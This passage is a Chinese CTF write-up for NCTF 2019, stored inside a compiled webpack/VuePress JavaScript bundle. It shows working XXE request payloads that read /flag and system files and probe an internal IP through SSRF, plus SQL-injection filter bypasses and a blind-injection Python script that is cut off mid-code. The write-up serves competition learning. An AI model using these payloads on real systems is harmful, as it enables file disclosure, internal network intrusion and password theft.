(window.webpackJsonp=window.webpackJsonp||[]).push([[74],{398:function(s,a,t){"use strict";t.r(a);var n=t(3),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"nctf-游记"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nctf-游记"}},[s._v("#")]),s._v(" NCTF 游记")]),s._v(" "),a("h2",{attrs:{id:"_0x00-前言"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x00-前言"}},[s._v("#")]),s._v(" 0x00 前言")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/images/nctf2019.png",alt:""}})]),s._v(" "),a("p",[s._v("又是一场被大佬出的“入门新手基础水题”虐爆的比赛。。。。。。。")]),s._v(" "),a("p",[s._v("pwn2和流量分析做的心态爆炸。。。。导致正常比赛下来都没做出啥题（其实是菜。。。。。。")]),s._v(" "),a("p",[s._v("最终盗版战队止步前十。。。。天璇的其他大佬都好强啊！(群除我佬。。。。)")]),s._v(" "),a("p",[s._v("收货：")]),s._v(" "),a("ul",[a("li",[s._v("XEE攻击基本方法")]),s._v(" "),a("li",[s._v("linux 系统中一些敏感文件及其作用")]),s._v(" "),a("li",[s._v("利用PIL写绘图脚本")]),s._v(" "),a("li",[s._v("chr().拼接字符串绕过引号限制")]),s._v(" "),a("li",[s._v("Wireshark 基本过滤操作的语法")]),s._v(" "),a("li",[s._v("SSRF 攻击")])]),s._v(" "),a("p",[s._v("Todo:")]),s._v(" "),a("ul",[a("li",[s._v("XXS 攻击的具体操作和原理")]),s._v(" "),a("li",[s._v("PIE 保护情况下基址的泄露方法和64位按字节写入的操作。。。。。。。。")]),s._v(" "),a("li",[s._v("一堆pwn的知识点 rop heap........")]),s._v(" "),a("li",[s._v("Crypto密码学相关知识 RSA AES.......")]),s._v(" "),a("li",[s._v("逆向patch.....")])]),s._v(" "),a("h2",{attrs:{id:"_0x01-fake-xml-cookbook"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-fake-xml-cookbook"}},[s._v("#")]),s._v(" 0x01 Fake XML cookbook")]),s._v(" "),a("p",[s._v("F12看了一眼发现")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('function doLogin(){\n\tvar username = $("#username").val();\n\tvar password = $("#password").val();\n\tif(username == "" || password == ""){\n\t\talert("Please enter the username and password!");\n\t\treturn;\n\t}\n\t\n\tvar data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; \n    $.ajax({\n        type: "POST",\n        url: "doLogin.php",\n        contentType: "application/xml;charset=utf-8",\n        data: data,\n        dataType: "xml",\n        anysc: false,\n        success: function (result) {\n        \tvar code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;\n        \tvar msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;\n        \tif(code == "0"){\n        \t\t$(".msg").text(msg + " login fail!");\n        \t}else if(code == "1"){\n        \t\t$(".msg").text(msg + " login success!");\n        \t}else{\n        \t\t$(".msg").text("error:" + msg);\n        \t}\n        },\n        error: function (XMLHttpRequest,textStatus,errorThrown) {\n            $(".msg").text(errorThrown + \':\' + textStatus);\n        }\n    }); \n}\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br")])]),a("p",[s._v("用XML和服务器通讯，联想到XXE攻击")]),s._v(" "),a("p",[s._v("burp抓post包得到")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("POST /doLogin.php HTTP/1.1\nHost: nctf2019.x1ct34m.com:40002\nContent-Length: 207\nAccept: application/xml, text/xml, */*; q=0.01\nOrigin: http://nctf2019.x1ct34m.com:40002\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\nDNT: 1\nContent-Type: application/xml;charset=UTF-8\nReferer: http://nctf2019.x1ct34m.com:40003/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\n<user><username>admin</username><password>123</password></user>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("根据js脚本可以发现username是可以回显的")]),s._v(" "),a("p",[s._v("然后构造一下exp")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('POST /doLogin.php HTTP/1.1\nHost: nctf2019.x1ct34m.com:40002\nContent-Length: 207\nAccept: application/xml, text/xml, */*; q=0.01\nOrigin: http://nctf2019.x1ct34m.com:40002\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\nDNT: 1\nContent-Type: application/xml;charset=UTF-8\nReferer: http://nctf2019.x1ct34m.com:40003/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">\n ]>\n\n<user><username>&xxe;</username><password>123</password></user>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("h2",{attrs:{id:"_0x02-true-xml-cookbook"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-true-xml-cookbook"}},[s._v("#")]),s._v(" 0x02 True XML cookbook")]),s._v(" "),a("p",[s._v("相当于第一题的加强版本")]),s._v(" "),a("p",[s._v("现在/flag里东西没了")]),s._v(" "),a("p",[s._v("看题目描述一开始以为要用上phar之类的骚操作，但是没有其他上传点了")]),s._v(" "),a("p",[s._v("fuzz读了一下 /var/www/html/doLogin.php")]),s._v(" "),a("p",[s._v("倒是有admin的密码了。。。")]),s._v(" "),a("p",[s._v("但是没啥用")]),s._v(" "),a("p",[s._v("读了/bin/sh 居然是有的。。。。")]),s._v(" "),a("p",[s._v("再读了读/etc/hosts 和/proc/net/arp")]),s._v(" "),a("p",[s._v("内网ip泄露")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n172.18.0.2\t3b6bacb4719b\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("IP address       HW type     Flags       HW address            Mask     Device\n192.168.1.40     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.75     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.55     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.16     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.63     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.249    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.24     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.39     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.70     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.47     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.8      0x1         0x2         02:42:c0:a8:01:08     *        eth0\n192.168.1.244    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.23     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.50     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.252    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.31     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.58     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.69     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.7      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.34     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.77     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.15     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.42     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.49     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.243    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.18     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.57     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.251    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.26     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.33     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.64     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.2      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.41     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.72     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.10     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.52     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.246    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.17     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.60     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.254    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.25     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.36     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.71     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.1      0x1         0x2         02:42:ea:57:7a:1c     *        eth0\n192.168.1.44     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.9      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.245    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.20     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.51     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.253    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.28     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.59     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.4      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.35     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.66     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.12     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.43     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.74     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.54     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.19     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.62     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.248    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.27     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.38     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.65     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.3      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.46     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.73     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.11     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.53     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.247    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.22     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.61     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.30     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.37     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.68     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.6      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.45     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.76     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.14     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.21     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.48     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.242    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.29     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.56     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.250    0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.5      0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.32     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.67     0x1         0x0         00:00:00:00:00:00     *        eth0\n192.168.1.13     0x1         0x0         00:00:00:00:00:00     *        eth0\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br"),a("span",{staticClass:"line-number"},[s._v("90")]),a("br"),a("span",{staticClass:"line-number"},[s._v("91")]),a("br")])]),a("p",[s._v("SSRF\nBurp Suite Introuder 爆破")]),s._v(" "),a("p",[s._v("192.168.1.8出了flag.....")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('POST /doLogin.php HTTP/1.1\nHost: nctf2019.x1ct34m.com:40003\nContent-Length: 220\nAccept: application/xml, text/xml, */*; q=0.01\nOrigin: http://nctf2019.x1ct34m.com:40003\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\nDNT: 1\nContent-Type: application/xml;charset=UTF-8\nReferer: http://nctf2019.x1ct34m.com:40003/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nConnection: close\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://192.168.1.8">\n ]>\n\n<user><username>&xxe;</username><password>123</password></user>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("h2",{attrs:{id:"_0x03-sqli-赛后复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-sqli-赛后复现"}},[s._v("#")]),s._v(" 0x03 SQLi (赛后复现)")]),s._v(" "),a("p",[s._v("直接给了sql语句")]),s._v(" "),a("div",{staticClass:"language-sql line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sql"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" users "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("where")]),s._v(" username"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("and")]),s._v(" passwd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("但是过滤了一堆"),a("code",[s._v("select . or ' like")]),s._v("基本都过滤了")]),s._v(" "),a("p",[s._v("然后这里的bypass技巧是")]),s._v(" "),a("blockquote",[a("p",[s._v("单引号可以使用"),a("code",[s._v("\\")]),s._v("来转义绕过，"),a("code",[s._v("or")]),s._v("可以采用"),a("code",[s._v("||")]),s._v(" "),a("code",[s._v("=")]),s._v("可以采用"),a("code",[s._v("regexp")]),s._v(","),a("code",[s._v("#")]),s._v("可以用``\\x00`替代")])]),s._v(" "),a("p",[s._v("然后基本上么得跨表查询，就只能盲注爆破password了")]),s._v(" "),a("p",[s._v("exp 核心代码部分")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("boolequ")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("end"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("end"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" ch "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n            payload"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v('"""||passwd/**/REGEXP/**/"^{}";\\x00"""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("format")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("ch"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n            data "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" 